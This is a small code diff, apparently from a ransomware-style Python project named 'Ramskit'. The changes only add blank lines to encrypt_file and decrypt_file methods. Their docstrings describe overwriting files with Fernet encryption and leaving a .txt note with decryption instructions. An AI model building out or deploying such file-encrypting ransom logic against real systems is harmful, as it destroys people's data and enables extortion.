@@ -45,6 +45,7 @@ class Ramskit:
     def encrypt_file(self, items: collections.Iterable, key: bytes) -> None:
         """ Encrypter's logic. It checks the key assigned in order to overwrite the file.
         It will generate a .txt file for some additional instructions to decrypt the data. """
+        
         fernet = Fernet(key)
 
         for item in items:
@@ -67,6 +68,7 @@ class Ramskit:
 
     def decrypt_file(self, items: collections.Iterable, key: bytes) -> None:
         """Decrypter's logic. It will decrypt the data, as well as deleting the .txt file.  """
+        
         fernet = Fernet(key)
 
         for item in items:
